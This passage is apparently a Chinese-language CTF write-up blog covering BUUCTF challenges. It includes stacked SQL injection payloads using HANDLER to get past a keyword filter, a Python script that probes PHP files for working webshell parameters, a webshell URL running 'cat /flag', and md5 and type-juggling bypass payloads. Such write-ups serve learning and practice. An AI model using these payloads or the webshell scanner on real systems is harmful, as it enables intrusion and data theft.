&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&amp;#34;&lt;/span&gt;,$inject);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;show tables;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;FlagHere
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;words
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看表结构：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;desc `FlagHere`;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来是看的wp，学到了个新姿势：使用&lt;code&gt;HANDLER ... OPEN&lt;/code&gt;语句，贴一个&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener"
&gt;官方文档&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HANDLER ... OPEN&lt;/code&gt;语句打开一个表，使其可以使用后续&lt;code&gt;HANDLER ... READ&lt;/code&gt;语句访问，该表对象未被其他会话共享，并且在会话调用&lt;code&gt;HANDLER ... CLOSE&lt;/code&gt;或会话终止之前不会关闭&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308111414.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="强网杯-2019高明的黑客"&gt;[强网杯 2019]高明的黑客
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308112326.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# codeing = utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; re
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; threading
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;adapters&lt;span style="color:#f92672"&gt;.&lt;/span&gt;DEFAULT_RETRIES &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;session &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;session()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;session&lt;span style="color:#f92672"&gt;.&lt;/span&gt;keep_alive &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sem&lt;span style="color:#f92672"&gt;=&lt;/span&gt;threading&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Semaphore(&lt;span style="color:#ae81ff"&gt;30&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;D:\DROPS\phpstudy_pro\WWW\ctf\src&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;fileNames &lt;span style="color:#f92672"&gt;=&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;listdir(path)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rrGET &lt;span style="color:#f92672"&gt;=&lt;/span&gt; re&lt;span style="color:#f92672"&gt;.&lt;/span&gt;compile(&lt;span style="color:#e6db74"&gt;r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;\$_GET\[\&amp;#39;(\w+)\&amp;#39;\]&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rrPOST &lt;span style="color:#f92672"&gt;=&lt;/span&gt; re&lt;span style="color:#f92672"&gt;.&lt;/span&gt;compile(&lt;span style="color:#e6db74"&gt;r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;\$_POST\[\&amp;#39;(\w+)\&amp;#39;\]&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;local_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;flag.txt&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;w&amp;#34;&lt;/span&gt;,encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;run&lt;/span&gt;(fileName):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;with&lt;/span&gt; sem:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(path&lt;span style="color:#f92672"&gt;+&lt;/span&gt;fileName,&lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;,encoding&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; content &lt;span style="color:#f92672"&gt;=&lt;/span&gt; file&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;[+]checking: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;fileName)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#GET&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; rrGET&lt;span style="color:#f92672"&gt;.&lt;/span&gt;findall(content):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; r &lt;span style="color:#f92672"&gt;=&lt;/span&gt; session&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(url&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;?&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;(fileName,i,&lt;span style="color:#e6db74"&gt;&amp;#34;echo ~guobanghhh~&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;~guobanghhh~&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; r&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; fileName &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;中的&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; i &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;可以用！！！&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; local_file&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#POST&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# for i in rrPOST.findall(content):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# r = session.post(url+fileName,data={i:&amp;#34;echo ~guobanghhh~&amp;#34;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# if &amp;#34;~guobanghhh~&amp;#34; in r.text:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# flag = fileName + &amp;#34;中的&amp;#34; + i + &amp;#34;可以用！！！&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# print(flag)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# local_file.write(flag)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; run(&lt;span style="color:#e6db74"&gt;&amp;#34;xk0SzyKwfzw.php&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; start_time &lt;span style="color:#f92672"&gt;=&lt;/span&gt; time&lt;span style="color:#f92672"&gt;.&lt;/span&gt;time() &lt;span style="color:#75715e"&gt;# 开始时间&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;[start]程序开始:&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; str(start_time))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; thread_list &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; fileName &lt;span style="color:#f92672"&gt;in&lt;/span&gt; fileNames:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t &lt;span style="color:#f92672"&gt;=&lt;/span&gt; threading&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Thread(target&lt;span style="color:#f92672"&gt;=&lt;/span&gt;run,args&lt;span style="color:#f92672"&gt;=&lt;/span&gt;(fileName,))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; thread_list&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(t)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; t &lt;span style="color:#f92672"&gt;in&lt;/span&gt; thread_list:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t&lt;span style="color:#f92672"&gt;.&lt;/span&gt;start()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; t &lt;span style="color:#f92672"&gt;in&lt;/span&gt; thread_list:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; t&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果就是访问&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="mrctf2020ez_bypass"&gt;[MRCTF2020]Ez_bypass
&lt;/h1&gt;&lt;p&gt;不截图了，主页没有代码格式，贴一个源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;I&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;put&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;something&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;in&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;F12&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;you&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;include&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$flag&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;gg&amp;#39;&lt;/span&gt;])&lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $id&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $gg&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;gg&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;($id) &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;($gg) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; $id &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; $gg) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;You got the first step&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $passwd&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;is_numeric&lt;/span&gt;($passwd))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($passwd&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1234567&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Good Job!&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;highlight_file&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;By Retr_0&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;can you think twice??&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;You can not get it !&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;only one way to get the flag&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;You are not a real hacker!&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Please input first&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#a6e22e"&gt;Please&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;input&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;first&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析一波：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较&lt;code&gt;===&lt;/code&gt;噢。&lt;/li&gt;
&lt;li&gt;第11、17行判断passwd是非数字并且若比较&lt;code&gt;==&lt;/code&gt;等于1234567&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一个利用数组即可绕过&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;md5([1,2,3]) == md5([4,5,6]) == NULL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第二个利用比较时会进行类型转换，字符串&lt;code&gt;1234567a&lt;/code&gt;会被强制转换类型为整型的&lt;code&gt;1234567&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?id[]=1&amp;amp;gg[]=2
POST
passwd=1234567a
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="buuctf-2018online-tool"&gt;[BUUCTF 2018]Online Tool
&lt;/h1&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;])) {
